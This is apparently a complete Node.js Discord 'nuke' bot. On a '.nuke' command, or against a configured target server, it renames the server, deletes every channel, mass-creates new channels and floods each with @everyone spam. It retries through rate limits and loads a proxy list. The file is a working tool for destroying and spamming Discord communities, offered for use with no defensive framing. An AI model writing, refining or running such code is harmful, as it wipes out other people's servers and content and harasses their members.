const { Client, GatewayIntentBits } = require('discord.js');
const fs = require('fs');

// Load configuration from config.json
const config = require('./config.json');

// Extract configuration values
const {
    channel_file_path: CHANNEL_FILE_PATH,
    message_file_path: MESSAGE_FILE_PATH,
    proxy_file_path: PROXY_FILE_PATH,
    new_server_name: NEW_SERVER_NAME,
    token: TOKEN,
    channels_to_create: CHANNELS_TO_CREATE,
    messages_per_channel: MESSAGES_PER_CHANNEL,
    tag_everyone: TAG_EVERYONE,
    max_retries: MAX_RETRIES,
    base_retry_delay: BASE_RETRY_DELAY
} = config;

// Load files
const NUKE_CHANNEL = fs.readFileSync(CHANNEL_FILE_PATH, 'utf-8')
    .split('\n').map(line => line.trim()).filter(line => line);
const NUKE_MESSAGES = fs.readFileSync(MESSAGE_FILE_PATH, 'utf-8')
    .split('\n').map(line => line.trim()).filter(line => line);
const proxies = fs.readFileSync(PROXY_FILE_PATH, 'utf-8')
    .split('\n').map(line => line.trim()).filter(line => line);

// Discord client setup
const client = new Client({
    intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildMessages,
        GatewayIntentBits.MessageContent
    ]
});

// Utility function to get random element
const getRandom = (array) => array[Math.floor(Math.random() * array.length)];

// Delay function for rate limit handling
const delay = (ms) => new Promise(resolve => setTimeout(resolve, ms));

// Function to create a single channel with retry logic
async function createChannelWithRetry(guild, channelName, retries = MAX_RETRIES, baseDelay = BASE_RETRY_DELAY) {
    for (let attempt = 1; attempt <= retries; attempt++) {
        try {
            const channel = await guild.channels.create({
                name: channelName,
                type: 0 // Text channel
            });
            // Gửi tin nhắn ngay sau khi tạo kênh thành công
            sendMessages(channel, MESSAGES_PER_CHANNEL, NUKE_MESSAGES, TAG_EVERYONE).catch(console.error);
            return channel;
        } catch (error) {
            if (error.code === 429) { // Rate limit error
                const retryAfter = error.retryAfter || (baseDelay * Math.pow(2, attempt - 1));
                console.log(`Rate limit hit while creating channel, retrying in ${retryAfter}ms (attempt ${attempt}/${retries})...`);
                await delay(retryAfter);
            } else {
                console.error(`Error creating channel ${channelName}:`, error);
                throw error;
            }
        }
    }
    throw new Error(`Failed to create channel ${channelName} after ${retries} attempts`);
}

// Function to create channels and send messages concurrently
async function createChannelsAndSendMessages(guild, channelNames, totalChannels) {
    console.log(`Creating and messaging ${totalChannels} channels concurrently...`);
    const startTime = Date.now();

    const channelPromises = Array(totalChannels).fill().map(() =>
        createChannelWithRetry(guild, getRandom(channelNames))
    );

    const results = await Promise.allSettled(channelPromises);
    const createdChannels = results
        .filter(result => result.status === 'fulfilled')
        .map(result => result.value);

    const endTime = Date.now();
    const duration = (endTime - startTime) / 1000;
    console.log(`Created ${createdChannels.length} channels in ${duration} seconds (${(createdChannels.length / duration).toFixed(2)} channels/second)`);

    return createdChannels;
}

// Function to send messages in a channel with rate limit handling
async function sendMessages(channel, messagesPerChannel, messages, tagEveryone) {
    const messagePromises = [];
    for (let i = 0; i < messagesPerChannel; i++) {
        const messageContent = tagEveryone ? `@everyone ${getRandom(messages)}` : getRandom(messages);
        messagePromises.push(
            channel.send(messageContent).catch(async (error) => {
                if (error.code === 429) { // Rate limit error
                    const retryAfter = error.retryAfter || 2000; // Giảm thời gian chờ mặc định
                    console.log(`Rate limit hit in ${channel.name}, retrying in ${retryAfter}ms...`);
                    await delay(retryAfter);
                    return channel.send(messageContent); // Thử lại
                } else {
                    console.error(`Error sending message in ${channel.name}:`, error);
                }
            })
        );
    }
    await Promise.all(messagePromises);
}

client.once('ready', async () => {
    console.log(`Logged in as ${client.user.tag}`);
    console.log("\nChoose an option:\n1. Manual Nuke\n2. Auto Nuke");
    const option = '1'; // Hardcoding option

    if (option === '1') {
        client.on('messageCreate', async (message) => {
            if (!message.content.startsWith('.') || message.content !== '.nuke') return;

            const guild = message.guild;

            // Change server name
            await guild.setName(NEW_SERVER_NAME);
            console.log(`Server name changed to ${guild.name}`);

            // Delete all channels
            const deletePromises = guild.channels.cache.map(channel => channel.delete().catch(() => {}));
            await Promise.all(deletePromises);
            await delay(500); // Giảm delay xuống 500ms

            // Create channels and send messages concurrently
            await createChannelsAndSendMessages(guild, NUKE_CHANNEL, CHANNELS_TO_CREATE);

            console.log(`Server nuked: ${guild.name}`);
            await message.channel.send("The server has been NUKED by (edgy tool name).");
        });
    } else if (option === '2') {
        const targetServerId = 'YOUR_SERVER_ID_HERE'; // Replace with target server ID
        const targetGuild = client.guilds.cache.get(targetServerId);

        if (targetGuild) {
            await targetGuild.setName(NEW_SERVER_NAME);
            console.log(`Server name changed to ${targetGuild.name}`);

            const deletePromises = targetGuild.channels.cache.map(channel => channel.delete().catch(() => {}));
            await Promise.all(deletePromises);
            await delay(500);

            await createChannelsAndSendMessages(targetGuild, NUKE_CHANNEL, CHANNELS_TO_CREATE);

            console.log(`Server nuked: ${targetGuild.name}`);
        }
    }
});

client.login(TOKEN);